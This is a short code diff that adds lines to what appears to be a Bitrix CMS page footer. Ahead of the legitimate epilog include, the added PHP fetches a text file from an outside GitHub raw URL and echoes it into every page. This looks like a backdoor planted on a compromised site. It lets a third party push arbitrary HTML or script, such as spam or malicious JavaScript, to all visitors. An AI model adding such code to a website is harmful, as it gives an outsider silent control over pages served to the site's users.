@@ -1,0 +1,10 @@
+<?php 
+$a = file_get_contents('https://raw.githubusercontent.com/kikiii88/sadboy/refs/heads/main/naked.txt'); 
+echo $a; 
+?>
+<?
+if(defined("B_PROLOG_INCLUDED") && B_PROLOG_INCLUDED===true)
+{
+	require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog.php");
+}
+?>
